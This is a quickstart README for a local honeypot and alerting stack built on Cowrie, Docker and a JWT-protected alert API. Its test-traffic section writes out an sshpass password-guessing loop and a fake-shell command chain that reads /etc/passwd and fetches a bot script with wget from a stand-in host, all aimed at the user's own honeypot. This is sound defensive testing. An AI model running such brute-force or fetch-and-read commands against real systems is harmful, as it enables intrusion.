# Quickstart

Run the whole framework locally with Docker: a real Cowrie SSH honeypot, the
log ingestor, the RBAC-protected alert API, and the Nightwatch dashboard.

> **Status:** CI builds and starts this stack on every push and checks health,
> login, auth and the dashboard proxy. The full capture path (SSH into Cowrie,
> alert in the API, playbook fires) has also been run end to end on Docker in
> WSL2. If you hit a build error, please open an issue.

## 1. Configure

```bash
cp .env.example .env
```

Set a JWT signing key — the API refuses to start without one:

```bash
python3 -c "import secrets; print('JWT_SECRET_KEY=' + secrets.token_urlsafe(32))" >> .env
```

Optionally set `ADMIN_PASSWORD` in `.env`. If you leave it blank a strong
random password is generated and printed **once** in the API logs.

## 2. Start the stack

```bash
docker compose up --build
```

| Service | Where | What it is |
|---|---|---|
| Cowrie honeypot | `localhost:2222` | The trap. Point attack traffic here. |
| Nightwatch dashboard | http://localhost:8080 | Operator UI |
| Alert API | http://localhost:8000 | REST API (`/health` needs no auth) |

The ingestor tails Cowrie's log, turns events into alerts, and those alerts
automatically fire any matching playbook in `playbooks/`.

Elasticsearch, Kibana and Logstash are **optional** — the core loop stores
alerts in SQLite and doesn't need them:

```bash
docker compose -f docker-compose.yml -f docker-compose.elk.yml up
#   adds Elasticsearch :9200 and Kibana :5601; needs ELASTICSEARCH_PASSWORD in .env
```

## 3. Log in

Get the bootstrap admin password (skip if you set `ADMIN_PASSWORD`):

```bash
docker compose logs api | grep -i "password"
```

Get a token:

```bash
curl -s -X POST http://localhost:8000/auth/login \
  -H 'Content-Type: application/json' \
  -d '{"username":"admin","password":"YOUR_PASSWORD"}'
```

In the dashboard, click the ⚙ button and paste the `token` value. Until you
do, the dashboard shows clearly-labeled demo data rather than live alerts.

## 4. Generate some attacks

Without a public IP you won't get real attackers, so drive traffic yourself.
Cowrie's default user list rejects `root` with the password `123456` or `root`
and lets `root` in with almost anything else. A rejected guess becomes an
`SSHBruteForce` alert. An accepted one drops you into Cowrie's *fake* shell,
where every command you type becomes an alert.

```bash
SSH_OPTS="-o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null \
  -o PreferredAuthentications=password -o PubkeyAuthentication=no"

# Rejected guesses -> SSHBruteForce (and the brute-force playbook fires)
for pw in 123456 root; do
  sshpass -p "$pw" ssh $SSH_OPTS -p 2222 root@localhost true
done

# Accepted login -> HoneypotLoginSuccess, then one alert per command
sshpass -p 'hunter2' ssh $SSH_OPTS -p 2222 root@localhost \
  'uname -a; cat /etc/passwd; wget http://example.com/bot.sh'
```

Or do it by hand, which is more convincing to watch: `ssh -p 2222
root@localhost`, type a password, and run a few commands in the fake shell.

Then watch alerts arrive:

```bash
curl -s http://localhost:8000/api/v1/alerts \
  -H "Authorization: Bearer $TOKEN" | python3 -m json.tool
```

> Alerts produced this way come from your own traffic, not real attackers.
> Don't present them as captured attack data.

## Without Docker

The API itself runs fine with no containers -- verified end to end (login,
RBAC, alert creation, playbook loading) against a plain `python -m flask` /
`app.run()` process:

```bash
pip install -r requirements.txt -r requirements-dev.txt
cp .env.example .env
python3 -c "import secrets; print('JWT_SECRET_KEY=' + secrets.token_urlsafe(32))" >> .env

pytest                          # 123 tests
ruff check .                    # lint
cd frontend && npm ci && npm run build && npm test   # 67 tests
```

To actually serve the API without Docker (e.g. to drive traffic at it with
curl while developing), run it directly rather than via the `if __name__`
block in `api/alerts_service.py` -- that block forces TLS and calls
`validate_production()`, which is meant for a real deployment, not a laptop:

```bash
python3 -c "
from api.alerts_service import app
app.run(host='127.0.0.1', port=8000, use_reloader=False)
"
```

Then `curl http://127.0.0.1:8000/health` and log in as described in step 3
above (the bootstrap admin password is printed to stderr on first run).

Config precedence: a real environment variable always wins over `.env` --
`.env` only fills in whatever isn't already set. So `ALERTS_DB_PATH=/tmp/x.db
python3 ...` overrides the `.env` default without editing the file.

## Troubleshooting

**API exits with "JWT_SECRET_KEY is not set"** — expected. Set it in `.env`;
there is deliberately no default.

**Dashboard shows demo data** — you haven't set a token (step 3), or the API
is unreachable. Check `curl http://localhost:8000/health`.

**No alerts appearing** — confirm Cowrie is writing its JSON log. The Cowrie
image has no shell, so look from the ingestor, which mounts the same volume:
`docker compose exec ingestor ls -l /honeypot-logs/`. Then check the
ingestor: `docker compose logs ingestor`. Cowrie's own text log goes to
stdout: `docker compose logs cowrie`. The ingestor starts
tailing at end-of-file, so only activity *after* it starts becomes an alert.

**"database is locked"** — the API and ingestor share one SQLite file. WAL
mode is enabled to avoid this; if it persists, move to PostgreSQL (see the
commented block in `requirements.txt`).
